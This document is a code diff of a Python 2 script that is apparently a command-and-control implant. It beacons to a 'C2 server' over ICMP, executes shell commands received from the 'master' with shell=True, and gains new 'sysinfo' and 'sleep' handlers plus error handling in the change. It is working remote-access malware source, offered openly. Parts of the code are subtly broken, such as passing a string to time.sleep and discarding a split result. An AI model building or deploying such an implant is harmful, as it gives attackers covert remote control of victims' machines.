@@ -26,17 +26,26 @@ def main(argv):
 		print "[*] String sent to C2 server: What shall I do master?" 
 		if p:
 			p.show()
-			response=p['Raw'].load
-			# Check ICMP data for 'run' command
-			print "[*] String received from C2 server: " + p['Raw'].load
-			if 'run' in response:
-				print "[*] Running command: " + response[4:]
-				command = response[4:]
-				command.split()
-				proc = sub.Popen(command,stdout=sub.PIPE,stderr=sub.PIPE,shell=True)
-       				output, errors = proc.communicate()
-        			print output
-        			print errors
+			try:
+				response=p['Raw'].load
+				# Check ICMP data for 'run' command
+				print "[*] String received from C2 server: " + p['Raw'].load
+				if 'run' in response:
+					print "[*] Running command: " + response[4:]
+					command = response[4:]
+					command.split()
+					proc = sub.Popen(command,stdout=sub.PIPE,stderr=sub.PIPE,shell=True)
+       					output, errors = proc.communicate()
+        				print output
+        				print errors
+				elif 'sysinfo' in response:
+					print "[*] Master requesting sysinfo"
+				elif 'sleep' in response:
+					seconds = response[6:]
+					print "[*] Master says sleep for (%s) seconds", seconds
+					time.sleep(seconds)
+			except:
+				print "[X] ERROR: ", sys.exc_info()[0] 
 		time.sleep(300)
 
 if __name__ == "__main__":
